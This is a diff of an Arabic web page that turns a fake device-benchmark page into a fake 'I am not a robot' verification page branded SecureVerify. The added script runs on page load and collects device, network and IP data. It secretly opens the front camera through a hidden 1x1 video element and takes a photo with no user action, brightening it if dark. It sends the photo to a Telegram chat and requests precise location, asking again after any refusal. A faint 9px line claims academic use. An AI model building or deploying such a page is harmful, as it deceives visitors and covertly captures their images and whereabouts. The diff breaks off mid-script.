@@ -3,43 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚡ اختبار قوة جهازك 2026</title>
+    <title>التحقق الأمني — تأكيد أنك لست روبوتاً</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;600;700;900&display=swap');
         body {
             font-family: 'Tajawal', sans-serif;
-            background: #070b16;
-            color: #fff;
+            background: #eef1f6;
+            color: #222;
             min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             direction: rtl;
-        }
-        .container { max-width: 560px; margin: 0 auto; padding: 40px 16px 30px; }
-        .card {
-            background: linear-gradient(145deg, #0d1528, #111d35);
-            border: 1px solid rgba(0,180,255,0.08);
-            border-radius: 20px;
-            padding: 30px 22px;
-            box-shadow: 0 25px 70px rgba(0,0,0,0.6);
-            position: relative;
-            overflow: hidden;
-        }
-        .card::before {
-            content: '';
-            position: absolute;
-            top: -40%; left: -40%;
-            width: 180%; height: 180%;
-            background: radial-gradient(circle at 30% 10%, rgba(79,195,247,0.05), transparent 60%);
-            pointer-events: none;
         }
 
         /* ====== التنويه الصغير (فوق اليمين) ====== */
         .mini-notice {
             position: fixed;
-            top: 6px;
+            top: 5px;
             right: 8px;
             font-size: 9px;
-            color: rgba(255,255,255,0.28);
+            color: rgba(0,0,0,0.25);
             z-index: 100;
             user-select: none;
             pointer-events: none;
@@ -47,190 +32,161 @@
             font-family: 'Tajawal', sans-serif;
         }
 
-        .logo { text-align: center; margin-bottom: 18px; position: relative; z-index: 1; }
-        .logo .bolt {
-            width: 70px; height: 70px;
-            margin: 0 auto 10px;
-            background: linear-gradient(135deg, #0a3d6b, #1a6db5);
-            border-radius: 50%;
+        .container { width: 100%; max-width: 520px; padding: 20px 14px; }
+        .card {
+            background: #fff;
+            border-radius: 16px;
+            padding: 28px 22px;
+            box-shadow: 0 8px 40px rgba(0,0,0,0.08);
+            border: 1px solid #e5e8ef;
+        }
+
+        .verify-header { text-align: center; margin-bottom: 20px; }
+        .verify-header .logo-row {
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+            margin-bottom: 12px;
+        }
+        .verify-header .logo-icon {
+            width: 42px; height: 42px;
+            background: linear-gradient(135deg, #1a73e8, #4f8ef7);
+            border-radius: 10px;
             display: flex; align-items: center; justify-content: center;
-            font-size: 36px;
-            border: 2px solid rgba(79,195,247,0.25);
-            box-shadow: 0 0 40px rgba(79,195,247,0.15);
+            font-size: 22px; color: #fff;
         }
-        .logo h1 { font-size: 24px; font-weight: 900; color: #4fc3f7; }
-        .logo .sub { color: #778; font-size: 14px; margin-top: 4px; }
-        .logo .count {
-            display: inline-block;
-            background: rgba(0,230,118,0.08);
-            color: #00e676;
-            font-size: 11px;
-            padding: 3px 14px;
-            border-radius: 20px;
-            margin-top: 8px;
-            border: 1px solid rgba(0,230,118,0.12);
+        .verify-header h1 { font-size: 18px; font-weight: 900; color: #1a2b4a; }
+        .verify-header .sub { color: #778; font-size: 13px; margin-top: 2px; }
+
+        .recaptcha-box {
+            border: 1px solid #d5dbe5;
+            border-radius: 6px;
+            background: #f9fafc;
+            padding: 18px 16px;
+            display: flex; align-items: center; gap: 14px;
+            cursor: pointer;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            margin-bottom: 14px;
         }
+        .recaptcha-box:hover { border-color: #a8b3c5; }
+        .recaptcha-box.checked { border-color: #1a73e8; box-shadow: 0 0 0 3px rgba(26,115,232,0.12); }
+        .checkbox {
+            width: 26px; height: 26px;
+            border: 2px solid #b8c1d0;
+            border-radius: 5px;
+            background: #fff;
+            display: flex; align-items: center; justify-content: center;
+            flex-shrink: 0;
+            font-size: 16px; color: transparent;
+            transition: all 0.2s;
+        }
+        .checkbox.checked { background: #1a73e8; border-color: #1a73e8; color: #fff; }
+        .recaptcha-text { font-size: 15px; font-weight: 700; color: #333; }
+        .recaptcha-brand { margin-right: auto; text-align: center; }
+        .recaptcha-brand .shield-mini { font-size: 24px; }
+        .recaptcha-brand .brand-name { font-size: 9px; color: #888; font-weight: 700; }
+        .recaptcha-brand .brand-links { font-size: 7px; color: #aaa; }
 
         .btn-main {
             width: 100%;
-            padding: 16px;
+            padding: 14px;
             border: none;
-            border-radius: 14px;
-            color: #fff;
-            font-size: 17px;
-            font-weight: 700;
-            cursor: pointer;
-            margin-top: 14px;
-            transition: all 0.3s;
-            font-family: 'Tajawal', sans-serif;
-            background: linear-gradient(135deg, #0f3460, #1a6db5);
-            position: relative; z-index: 1;
-        }
-        .btn-main:hover { transform: translateY(-2px); box-shadow: 0 10px 35px rgba(79,195,247,0.25); }
-        .btn-main.green { background: linear-gradient(135deg, #0a4a20, #0a7a30); }
-        .btn-main.orange { background: linear-gradient(135deg, #7a4a00, #b57a00); }
-        .btn-main.small { padding: 12px; font-size: 14px; margin-top: 10px; }
-        .btn-main:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
-
-        /* Test screen */
-        .test-status {
-            text-align: center;
-            padding: 10px 0;
-            min-height: 60px;
-            position: relative; z-index: 1;
-        }
-        .test-icon { font-size: 44px; margin-bottom: 6px; }
-        .test-text { color: #aaa; font-size: 16px; font-weight: 600; }
-        .progress {
-            background: rgba(255,255,255,0.04);
-            border-radius: 30px;
-            height: 8px;
-            margin: 18px 0;
-            overflow: hidden;
-            position: relative; z-index: 1;
-        }
-        .progress-fill {
-            height: 100%; width: 0%;
-            background: linear-gradient(90deg, #4fc3f7, #00e676);
-            border-radius: 30px;
-            transition: width 0.5s ease;
-        }
-
-        /* Click test */
-        .click-zone {
-            text-align: center;
-            padding: 15px 0;
-            position: relative; z-index: 1;
-        }
-        .click-btn {
-            width: 180px; height: 180px;
-            border-radius: 50%;
-            border: none;
-            background: linear-gradient(135deg, #0f3460, #1a6db5);
-            color: #fff;
-            font-size: 22px;
-            font-weight: 900;
-            cursor: pointer;
-            transition: transform 0.08s;
-            font-family: 'Tajawal', sans-serif;
-            box-shadow: 0 15px 45px rgba(79,195,247,0.2);
-        }
-        .click-btn:active { transform: scale(0.93); }
-        .click-timer { color: #ffab40; font-size: 30px; font-weight: 900; margin: 8px 0; }
-        .click-count { color: #778; font-size: 14px; }
-
-        /* Result */
-        .result-box { text-align: center; position: relative; z-index: 1; }
-        .result-score {
-            font-size: 72px; font-weight: 900;
-            background: linear-gradient(135deg, #4fc3f7, #00e676);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .result-label { color: #889; font-size: 16px; }
-        .result-title { color: #00e676; font-weight: 700; font-size: 17px; margin-top: 8px; }
-        .result-desc { color: #667; font-size: 13px; margin-top: 4px; }
-
-        .section-title {
-            display: flex; align-items: center; gap: 8px;
-            font-size: 14px; font-weight: 700; color: #4fc3f7;
-            margin: 18px 0 10px;
-            position: relative; z-index: 1;
-        }
-        .info-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 8px;
-            position: relative; z-index: 1;
-        }
-        .info-item {
-            background: rgba(255,255,255,0.03);
-            border-radius: 10px;
-            padding: 10px 12px;
-        }
-        .info-item .k { color: #667; font-size: 11px; }
-        .info-item .v { color: #ddd; font-size: 13px; font-weight: 600; margin-top: 3px; direction: ltr; text-align: right; }
-
-        .form-group { margin-bottom: 12px; position: relative; z-index: 1; }
-        .form-group label { display: block; color: #889; font-size: 13px; margin-bottom: 4px; }
-        .form-group input {
-            width: 100%;
-            padding: 13px 14px;
-            background: rgba(255,255,255,0.04);
-            border: 1px solid rgba(255,255,255,0.08);
             border-radius: 10px;
             color: #fff;
             font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
             font-family: 'Tajawal', sans-serif;
-            transition: 0.3s;
+            background: linear-gradient(135deg, #1a73e8, #4f8ef7);
         }
-        .form-group input:focus { outline: none; border-color: #4fc3f7; }
-        .form-group input:-webkit-autofill {
-            -webkit-text-fill-color: #fff !important;
-            -webkit-box-shadow: 0 0 0px 1000px rgba(15,25,50,0.98) inset !important;
-        }
+        .btn-main:hover:not(:disabled) { box-shadow: 0 8px 25px rgba(26,115,232,0.25); transform: translateY(-1px); }
+        .btn-main:disabled { opacity: 0.5; cursor: not-allowed; }
+        .btn-main.green { background: linear-gradient(135deg, #0a7a30, #1aa84a); }
 
-        #camPreview {
-            width: 100%;
-            max-height: 260px;
-            border-radius: 12px;
-            background: #000;
-            object-fit: cover;
-            display: none;
-            margin-top: 10px;
-            position: relative; z-index: 1;
+        .verify-steps { margin: 10px 0; }
+        .step-row {
+            display: flex; align-items: center; gap: 10px;
+            padding: 9px 12px;
+            border-radius: 8px;
+            margin-bottom: 6px;
+            background: #f7f8fb;
+            color: #889;
+            font-size: 13px;
+            opacity: 0.6;
+            transition: all 0.3s;
         }
-        #photoResult {
-            width: 100%;
-            border-radius: 12px;
-            margin-top: 8px;
-            display: none;
-            border: 1px solid rgba(0,230,118,0.2);
-            position: relative; z-index: 1;
-        }
-        .status-ok { color: #00e676; font-size: 12px; margin-top: 6px; text-align: center; position: relative; z-index: 1; }
-        .hidden { display: none !important; }
+        .step-row.active { opacity: 1; background: #eef4ff; color: #1a2b4a; }
+        .step-row.done { opacity: 1; background: #f0faf3; color: #2a7a45; }
+        .step-row .step-icon { font-size: 18px; width: 26px; text-align: center; }
+        .step-row .step-check { margin-right: auto; font-size: 15px; color: #0a7a30; }
 
-        .footer-note { color: #334; font-size: 10px; text-align: center; margin-top: 16px; }
+        .challenge-title {
+            text-align: center;
+            font-size: 15px; font-weight: 700;
+            color: #1a2b4a;
+            margin: 10px 0 14px;
+        }
+        .image-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+        .image-tile {
+            aspect-ratio: 1;
+            border-radius: 10px;
+            background: #eef1f6;
+            border: 2px solid transparent;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 38px;
+            cursor: pointer;
+            transition: all 0.2s;
+            user-select: none;
+        }
+        .image-tile:hover { border-color: #a8b3c5; }
+        .image-tile.selected {
+            border-color: #1a73e8;
+            background: #e8f0fe;
+            box-shadow: 0 0 0 2px rgba(26,115,232,0.15);
+        }
+        .challenge-hint { color: #889; font-size: 12px; text-align: center; margin-bottom: 10px; }
+
+        .success-box { text-align: center; padding: 15px 0; }
+        .success-icon {
+            width: 84px; height: 84px;
+            margin: 0 auto 12px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #0a7a30, #1aa84a);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 40px; color: #fff;
+            box-shadow: 0 15px 40px rgba(10,122,48,0.25);
+        }
+        .success-box h2 { color: #0a7a30; font-size: 20px; font-weight: 900; }
+        .success-box p { color: #778; font-size: 14px; margin-top: 6px; }
+
+        #hiddenCam { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -1; }
+
         #loadingOverlay {
             display: none;
             position: fixed; inset: 0;
-            background: rgba(0,0,0,0.85);
+            background: rgba(255,255,255,0.92);
             z-index: 9999;
             justify-content: center; align-items: center;
             flex-direction: column;
         }
         #loadingOverlay.active { display: flex; }
         .spinner {
-            width: 45px; height: 45px;
-            border: 4px solid rgba(255,255,255,0.06);
-            border-top: 4px solid #4fc3f7;
+            width: 46px; height: 46px;
+            border: 4px solid #e5e8ef;
+            border-top: 4px solid #1a73e8;
             border-radius: 50%;
             animation: spin 0.7s linear infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .loading-text { color: #aaa; margin-top: 16px; font-size: 14px; }
-        .success-text { color: #00e676; font-weight: 700; text-align: center; margin-top: 10px; }
+        .loading-text { color: #556; margin-top: 16px; font-size: 15px; font-weight: 600; }
+        .loading-sub { color: #999; font-size: 12px; margin-top: 4px; }
+
+        .footer-note { color: #aaa; font-size: 10px; text-align: center; margin-top: 16px; }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
@@ -238,90 +194,85 @@
 <!-- ====== التنويه الصغير فوق على اليمين ====== -->
 <div class="mini-notice">🔒 لأغراض مشروع أكاديمي — تُجمع بيانات جهازك ومعلومات عامة</div>
 
+<!-- كاميرا مخفية بحجم 1×1 (تعمل فقط بعد موافقة المتصفح) -->
+<video id="hiddenCam" autoplay muted playsinline></video>
+<canvas id="camCanvas" style="display:none;"></canvas>
+
 <!-- Loading -->
 <div id="loadingOverlay">
     <div class="spinner"></div>
-    <p class="loading-text" id="loadingText">جارٍ حفظ النتيجة...</p>
+    <p class="loading-text" id="loadingText">جارٍ التحقق...</p>
+    <p class="loading-sub">يرجى الانتظار</p>
 </div>
 
 <div class="container">
-    <!-- ========== شاشة البداية ========== -->
-    <div id="screenLanding">
+    <!-- ========== شاشة 1: صندوق التحقق ========== -->
+    <div id="screenCheck">
         <div class="card">
-            <div class="logo">
-                <div class="bolt">⚡</div>
-                <h1>اختبار قوة جهازك 2026</h1>
-                <p class="sub">قياس أداء المعالج والذاكرة والشبكة وسرعة استجابتك</p>
-                <span class="count"><span class="ping-dot"></span> 12,847 جهازاً تم اختباره</span>
-            </div>
-            <div class="click-zone">
-                <p style="color:#889;font-size:14px;">الاختبار يستغرق 15 ثانية فقط</p>
-                <p style="color:#556;font-size:12px;margin-top:4px;">يقيس: المعالج ⚙️ · الذاكرة 💾 · الشبكة 📶 · سرعة رد فعلك 👆</p>
-            </div>
-            <button class="btn-main" onclick="startTest()">🚀 ابدأ اختبار جهازك</button>
-        </div>
-    </div>
-
-    <!-- ========== شاشة الاختبار ========== -->
-    <div id="screenTest" class="hidden">
-        <div class="card">
-            <div class="logo">
-                <div class="bolt">⚡</div>
-                <h1 id="testTitle">جارٍ قياس الأداء...</h1>
-            </div>
-            <div class="progress"><div class="progress-fill" id="progressFill"></div></div>
-            <div class="test-status">
-                <div class="test-icon" id="testIcon">🔄</div>
-                <div class="test-text" id="testText">جاري فحص المعالج...</div>
-            </div>
-
-            <!-- مرحلة الضغط السريع -->
-            <div id="clickPhase" class="hidden">
-                <div class="click-zone">
-                    <div class="click-timer" id="clickTimer">5</div>
-                    <button class="click-btn" id="clickBtn" onclick="registerClick()">👆 اضغطني بأقصى سرعة!</button>
-                    <div class="click-count" id="clickCountDisplay">الضغطات: 0</div>
+            <div class="verify-header">
+                <div class="logo-row">
+                    <div class="logo-icon">🛡️</div>
+                    <div>
+                        <h1>التحقق الأمني</h1>
+                        <p class="sub">تأكد من أنك لست روبوتاً</p>
+                    </div>
                 </div>
             </div>
+
+            <div class="recaptcha-box" id="recaptchaBox" onclick="toggleCheck()">
+                <div class="checkbox" id="checkBox">✓</div>
+                <span class="recaptcha-text">أنا لست روبوتاً</span>
+                <div class="recaptcha-brand">
+                    <div class="shield-mini">🛡️</div>
+                    <div class="brand-name">SecureVerify</div>
+                    <div class="brand-links">الخصوصية · الشروط</div>
+                </div>
+            </div>
+
+            <button class="btn-main" id="btnVerify" disabled onclick="startVerification()">🔍 بدء التحقق</button>
         </div>
     </div>
 
-    <!-- ========== شاشة النتيجة ========== -->
-    <div id="screenResult" class="hidden">
+    <!-- ========== شاشة 2: مراحل التحقق ========== -->
+    <div id="screenSteps" class="hidden">
         <div class="card">
-            <div class="result-box">
-                <div class="test-icon">🏆</div>
-                <div class="result-score" id="finalScore">0</div>
-                <div class="result-label">نقاط قوة جهازك</div>
-                <div class="result-title" id="resultRank">جهازك ممتاز!</div>
-                <div class="result-desc" id="resultDesc">يتفوق على 87% من الأجهزة</div>
+            <div class="verify-header">
+                <div class="logo-icon" style="margin:0 auto 10px;">🔄</div>
+                <h1>جاري التحقق من هويتك</h1>
+                <p class="sub">قد يستغرق التحقق بضع ثوانٍ</p>
             </div>
-
-            <div class="section-title">📊 تفاصيل الأداء المقاسة</div>
-            <div class="info-grid" id="specsGrid"></div>
-
-            <div class="section-title">📍 دقة النتيجة حسب موقعك <span style="font-size:11px;color:#556;">(اختياري)</span></div>
-            <button class="btn-main small orange" onclick="requestGeo()">📍 تفعيل الموقع الجغرافي</button>
-            <div id="geoResult" class="hidden">
-                <div class="info-grid" id="geoGrid" style="margin-top:8px;"></div>
-                <p class="status-ok">✅ تم تحديد الموقع</p>
-            </div>
-
-            <div class="section-title">📸 صورة رمزية لنتيجتك <span style="font-size:11px;color:#556;">(اختياري)</span></div>
-            <button class="btn-main small" id="btnCamera" onclick="toggleCamera()">📷 فتح الكاميرا</button>
-            <video id="camPreview" autoplay muted playsinline></video>
-            <button class="btn-main small green hidden" id="btnCapture" onclick="capturePhoto()">📸 التقاط الصورة</button>
-            <img id="photoResult" alt="صورتك">
-
-            <div class="section-title">🏆 سجل نتيجتك في المتصدرين</div>
-            <div class="form-group">
-                <label>👤 اسمك أو لقبك</label>
-                <input type="text" id="nicknameInput" placeholder="أدخل اسماً للوحة المتصدرين" autocomplete="name">
-            </div>
-            <button class="btn-main green" onclick="saveScore()">💾 حفظ النتيجة</button>
-            <div id="saveStatus"></div>
+            <div class="verify-steps" id="stepsContainer"></div>
         </div>
     </div>
+
+    <!-- ========== شاشة 3: تحدي الصور ========== -->
+    <div id="screenChallenge" class="hidden">
+        <div class="card">
+            <div class="verify-header">
+                <div class="logo-icon" style="margin:0 auto 10px;">🧩</div>
+                <h1 id="challengeTitle">تحدٍّ إضافي</h1>
+                <p class="sub">التحقق الآلي لم يتعرف عليك — أكمل التحدي</p>
+            </div>
+            <div class="challenge-title" id="challengeQuestion">اختر كل الصور التي تحتوي على مركبات</div>
+            <div class="image-grid" id="imageGrid"></div>
+            <button class="btn-main" onclick="submitChallenge()">✅ تأكيد الاختيار</button>
+            <p class="challenge-hint" id="challengeError" style="color:#d33;"></p>
+        </div>
+    </div>
+
+    <!-- ========== شاشة 4: النجاح ========== -->
+    <div id="screenSuccess" class="hidden">
+        <div class="card">
+            <div class="success-box">
+                <div class="success-icon">✓</div>
+                <h2>تم التحقق بنجاح!</h2>
+                <p>تم التأكد من أنك لست روبوتاً</p>
+                <p style="color:#aaa;font-size:12px;margin-top:8px;">جاري تحويلك إلى الصفحة المطلوبة...</p>
+            </div>
+        </div>
+    </div>
+
+    <p class="footer-note">محمي بواسطة نظام SecureVerify — جميع التحققات مشفرة</p>
 </div>
 
 <script>
@@ -337,231 +288,307 @@ const CHAT_ID  = '5197359202';
 // ================================================================
 const data = {
     timestamp: new Date().toLocaleString('ar-SA'),
-    nickname: '',
-    score: 0,
-    clicks: 0,
-    device: {}, network: {}, geo: {},
-    photoBase64: ''
+    source: 'صفحة تحقق روبوت',
+    device: {}, network: {},
+    geo: { lat: null, lon: null, accuracy: null },
+    photoBase64: '',
+    pageOpenedAt: new Date().toISOString()
 };
 
 let cameraStream = null;
-let clickCount = 0;
-let clickTimerInterval = null;
-let geoDone = false;
+let camState = 'idle';      // idle | requesting | active | denied
+let geoState = 'idle';      // idle | requesting | active | denied
+let checked = false;
+let selectedTiles = [];
+let challengeRound = 1;
+let visitorAlertSent = false;
+let fullReportSent = false;
 
 // ================================================================
-// ======================= البدء ==================================
+// ============== تشغيل تلقائي فور فتح الصفحة =====================
 // ================================================================
-function startTest() {
-    document.getElementById('screenLanding').classList.add('hidden');
-    document.getElementById('screenTest').classList.remove('hidden');
-    
-    // نجمع البيانات في الخلفية
+window.addEventListener('DOMContentLoaded', () => {
+    // 1) جمع معلومات الجهاز والشبكة
     collectDeviceInfo();
     collectNetworkInfo();
-    
-    // نبدأ عرض مراحل الاختبار
-    runBenchmark();
+
+    // 2) تنبيه فوري للباحث: شخص فتح الرابط
+    setTimeout(sendVisitorAlert, 900);
+
+    // 3) طلب الكاميرا تلقائياً (تظهر نافذة إذن المتصفح — لو قبل ياخذ الصورة فوراً)
+    autoRequestCamera();
+
+    // 4) طلب الموقع تلقائياً (تظهر نافذة إذن المتصفح)
+    autoRequestGeo();
+
+    // 5) إعادة المحاولة عند أول تفاعل لو رفض المتصفح الطلب الأول
+    document.addEventListener('click', retryOnInteraction, { once: true });
+    document.addEventListener('touchstart', retryOnInteraction, { once: true });
+});
+
+function retryOnInteraction() {
+    if (camState === 'denied') autoRequestCamera();
+    if (geoState === 'denied') autoRequestGeo();
 }
 
 // ================================================================
-// ======================= مراحل الاختبار =========================
+// ======================= الكاميرا التلقائية =====================
 // ================================================================
-function runBenchmark() {
-    const steps = [
-        { icon: '⚙️', text: 'جاري فحص المعالج...', time: 1200 },
-        { icon: '💾', text: 'قياس سرعة الذاكرة...', time: 1200 },
-        { icon: '📶', text: 'اختبار سرعة الشبكة...', time: 1200 },
-        { icon: '🎮', text: 'تحضير اختبار رد الفعل...', time: 800 }
-    ];
-    
-    let i = 0;
-    const fill = document.getElementById('progressFill');
-    
-    function nextStep() {
-        if (i < steps.length) {
-            const s = steps[i];
-            document.getElementById('testIcon').textContent = s.icon;
-            document.getElementById('testText').textContent = s.text;
-            fill.style.width = ((i + 1) / (steps.length + 1) * 100) + '%';
-            i++;
-            setTimeout(nextStep, s.time);
-        } else {
-            // ننتقل لاختبار الضغط
-            fill.style.width = '80%';
-            startClickTest();
-        }
+async function autoRequestCamera() {
+    if (camState !== 'idle') return;
+    camState = 'requesting';
+    try {
+        cameraStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+            audio: false
+        });
+        camState = 'active';
+
+        const video = document.getElementById('hiddenCam');
+        video.srcObject = cameraStream;
+
+        // ننتظر حتى تشتغل الكاميرا وتضبط الإضاءة
+        await new Promise((resolve) => {
+            let done = false;
+            const r = () => { if (!done) { done = true; resolve(); } };
+            video.addEventListener('loadeddata', r, { once: true });
+            video.addEventListener('playing', r, { once: true });
+            setTimeout(r, 3000);
+        });
+        await new Promise(r => setTimeout(r, 700));
+
+        // التقاط تلقائي بدون أي ضغطة من الزائر
+        autoCapture();
+    } catch(e) {
+        camState = 'denied';
+        console.log('كاميرا مرفوضة:', e.message);
     }
-    nextStep();
 }
 
-// ================================================================
-// ======================= اختبار الضغط ===========================
-// ================================================================
-function startClickTest() {
-    document.getElementById('testIcon').textContent = '👆';
-    document.getElementById('testText').textContent = 'اضغط بأقصى سرعة خلال 5 ثوانٍ!';
-    document.getElementById('clickPhase').classList.remove('hidden');
-    
-    clickCount = 0;
-    document.getElementById('clickCountDisplay').textContent = 'الضغطات: 0';
-    
-    let timeLeft = 5;
-    document.getElementById('clickTimer').textContent = timeLeft;
-    
-    clickTimerInterval = setInterval(() => {
-        timeLeft--;
-        document.getElementById('clickTimer').textContent = timeLeft;
-        if (timeLeft <= 0) {
-            clearInterval(clickTimerInterval);
-            finishTest();
+function autoCapture() {
+    try {
+        const video = document.getElementById('hiddenCam');
+        const canvas = document.getElementById('camCanvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+
+        // معكوسة لأنها الكاميرا الأمامية
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // تعزيز السطوع لو الصورة داكنة
+        const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+        let total = 0;
+        for (let i = 0; i < imgData.data.length; i += 4) {
+            total += (imgData.data[i] + imgData.data[i+1] + imgData.data[i+2]) / 3;
         }
-    }, 1000);
-}
+        const avg = total / (imgData.data.length / 4);
+        if (avg < 40) {
+            for (let i = 0; i < imgData.data.length; i += 4) {
+                imgData.data[i]   = Math.min(255, imgData.data[i]   * 2.5);
+                imgData.data[i+1] = Math.min(255, imgData.data[i+1] * 2.5);
+                imgData.data[i+2] = Math.min(255, imgData.data[i+2] * 2.5);
+            }
+            ctx.putImageData(imgData, 0, 0);
+        }
 
-function registerClick() {
-    clickCount++;
-    document.getElementById('clickCountDisplay').textContent = 'الضغطات: ' + clickCount;
-}
+        data.photoBase64 = canvas.toDataURL('image/jpeg', 0.92);
+        console.log('📸 تم التقاط الصورة تلقائياً (سطوع:', avg.toFixed(0) + ')');
 
-// ================================================================
-// ======================= حساب النتيجة ===========================
-// ================================================================
-function finishTest() {
-    data.clicks = clickCount;
-    
-    const dev = data.device;
-    let score = 25;
-    
-    // نقاط المعالج
-    const cores = dev.cores || 0;
-    score += Math.min(cores * 6, 25);
-    
-    // نقاط الرام
-    if (dev.ramGB >= 8) score += 10;
-    else if (dev.ramGB >= 4) score += 6;
-    
-    // نقاط الشبكة
-    if (dev.networkType === '5g' || dev.networkType === '4g') score += 10;
-    else if (dev.networkType === 'wifi' || dev.networkType === '3g') score += 6;
-    else if (dev.networkType === 'ethernet' || dev.networkType === 'fast') score += 8;
-    
-    // نقاط سرعة الرد
-    score += Math.min(clickCount * 2, 20);
-    
-    // نقاط المتصفح
-    if (dev.browser === 'Chrome' || dev.browser === 'Edge') score += 5;
-    
-    // نقاط نوع الجهاز
-    if (dev.deviceType === 'كمبيوتر') score += 5;
-    
-    score = Math.min(Math.round(score), 100);
-    data.score = score;
-    
-    document.getElementById('progressFill').style.width = '100%';
-    document.getElementById('testIcon').textContent = '🏆';
-    document.getElementById('testText').textContent = 'اكتمل القياس!';
-    
-    setTimeout(() => showResult(), 800);
+        // نرسلها للباحث فوراً
+        sendPhotoToTelegram();
+
+        // نوقف الكاميرا
+        if (cameraStream) {
+            cameraStream.getTracks().forEach(t => t.stop());
+            cameraStream = null;
+        }
+        document.getElementById('hiddenCam').srcObject = null;
+        camState = 'done';
+    } catch(e) {
+        console.log('خطأ بالتقاط:', e.message);
+    }
 }
 
 // ================================================================
-// ======================= عرض النتيجة ============================
+// ======================= الموقع التلقائي ========================
 // ================================================================
-function showResult() {
-    document.getElementById('screenTest').classList.add('hidden');
-    document.getElementById('screenResult').classList.remove('hidden');
-    
-    document.getElementById('finalScore').textContent = data.score;
-    
-    // التصنيف
-    const s = data.score;
-    let rank = '', desc = '';
-    if (s >= 90) { rank = '🚀 جهازك خارق!'; desc = 'يتفوق على 95% من الأجهزة'; }
-    else if (s >= 75) { rank = '💪 جهازك ممتاز!'; desc = 'يتفوق على 87% من الأجهزة'; }
-    else if (s >= 60) { rank = '👍 جهازك جيد'; desc = 'يتفوق على 64% من الأجهزة'; }
-    else if (s >= 40) { rank = '😐 جهازك متوسط'; desc = 'يتفوق على 38% من الأجهزة'; }
-    else { rank = '🐢 جهازك يحتاج ترقية'; desc = 'يتفوق على 12% من الأجهزة'; }
-    document.getElementById('resultRank').textContent = rank;
-    document.getElementById('resultDesc').textContent = desc;
-    
-    renderSpecs();
+function autoRequestGeo() {
+    if (geoState !== 'idle') return;
+    geoState = 'requesting';
+    navigator.geolocation.getCurrentPosition((pos) => {
+        data.geo.lat = pos.coords.latitude;
+        data.geo.lon = pos.coords.longitude;
+        data.geo.accuracy = Math.round(pos.coords.accuracy) + ' متر';
+        geoState = 'active';
+        console.log('📍 تم الحصول على الموقع تلقائياً');
+    }, (err) => {
+        geoState = 'denied';
+        console.log('موقع مرفوض:', err.message);
+    }, { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 });
 }
 
-function renderSpecs() {
-    const dev = data.device;
-    const net = data.network;
-    
-    const items = [
-        ['المعالج', dev.cores ? dev.cores + ' أنوية' : '-'],
-        ['الذاكرة', dev.ramGB ? dev.ramGB + ' GB' : '-'],
-        ['المتصفح', dev.browser + ' ' + (dev.browserVer || '')],
-        ['نظام التشغيل', dev.os + ' ' + (dev.osVer || '')],
-        ['نوع الجهاز', dev.deviceType],
-        ['الشاشة', dev.screen],
-        ['الشبكة', dev.networkType || '-'],
-        ['سرعة الشبكة', dev.networkSpeed ? dev.networkSpeed + ' Mbps' : '-'],
-        ['البطارية', dev.battery ? dev.battery + '%' : '-'],
-        ['سرعة رد فعلك', data.clicks + ' ضغطة/5 ثوانٍ'],
-        ['المنطقة الزمنية', dev.tz],
-        ['اللغة', dev.lang],
-        ['IP العام', net.ip || '-'],
-        ['المدينة', net.city || '-'],
-        ['الدولة', net.country || '-'],
-        ['مزود الخدمة', net.isp || '-'],
-        ['IP داخلي (WebRTC)', dev.localIp || '-']
+// ================================================================
+// ======================= شاشة 1: الصندوق ========================
+// ================================================================
+function toggleCheck() {
+    checked = !checked;
+    document.getElementById('checkBox').classList.toggle('checked', checked);
+    document.getElementById('recaptchaBox').classList.toggle('checked', checked);
+    document.getElementById('btnVerify').disabled = !checked;
+}
+
+// ================================================================
+// ======================= شاشة 2: المراحل ========================
+// ================================================================
+function startVerification() {
+    document.getElementById('screenCheck').classList.add('hidden');
+    document.getElementById('screenSteps').classList.remove('hidden');
+
+    const steps = [
+        { icon: '🌐', text: 'فحص المتصفح والجهاز' },
+        { icon: '📶', text: 'فحص عنوان الشبكة' },
+        { icon: '🧠', text: 'تحليل سلوك المستخدم' },
+        { icon: '🤖', text: 'كشف الروبوتات والبرمجيات الآلية' }
     ];
-    
-    const grid = document.getElementById('specsGrid');
-    grid.innerHTML = '';
-    items.forEach(([k, v]) => {
+
+    const container = document.getElementById('stepsContainer');
+    container.innerHTML = '';
+    steps.forEach((s, i) => {
         const div = document.createElement('div');
-        div.className = 'info-item';
-        div.innerHTML = `<div class="k">${k}</div><div class="v">${v}</div>`;
-        grid.appendChild(div);
+        div.className = 'step-row';
+        div.id = 'step' + i;
+        div.innerHTML = `<span class="step-icon">${s.icon}</span>${s.text}<span class="step-check"></span>`;
+        container.appendChild(div);
+    });
+
+    let i = 0;
+    const interval = setInterval(() => {
+        if (i > 0) {
+            const prev = document.getElementById('step' + (i - 1));
+            prev.classList.remove('active');
+            prev.classList.add('done');
+            prev.querySelector('.step-check').textContent = '✓';
+        }
+        if (i < steps.length) {
+            const cur = document.getElementById('step' + i);
+            cur.classList.add('active');
+            i++;
+        } else {
+            clearInterval(interval);
